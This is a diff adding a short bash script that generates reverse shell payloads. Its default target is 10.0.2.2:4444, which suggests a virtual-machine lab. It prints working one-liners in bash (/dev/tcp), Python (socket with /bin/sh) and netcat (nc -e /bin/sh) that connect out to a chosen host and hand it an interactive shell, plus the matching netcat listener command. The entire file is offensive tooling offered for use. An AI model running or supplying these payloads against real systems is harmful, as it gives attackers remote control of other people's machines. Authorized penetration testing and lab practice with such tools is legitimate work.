@@ -1,0 +1,24 @@
+#!/bin/bash
+# =============================================================================
+# Reverse Shell Generator
+# =============================================================================
+# Usage: revshell [ip] [port]
+# Default: 10.0.2.2:4444
+
+IP=${1:-10.0.2.2}
+PORT=${2:-4444}
+
+echo "Reverse shell payloads for $IP:$PORT"
+echo "=================================="
+echo ""
+echo "Bash:"
+echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+echo ""
+echo "Python:"
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+echo ""
+echo "NC (netcat):"
+echo "nc -e /bin/sh $IP $PORT"
+echo ""
+echo "Listener command:"
+echo "nc -lvp $PORT"
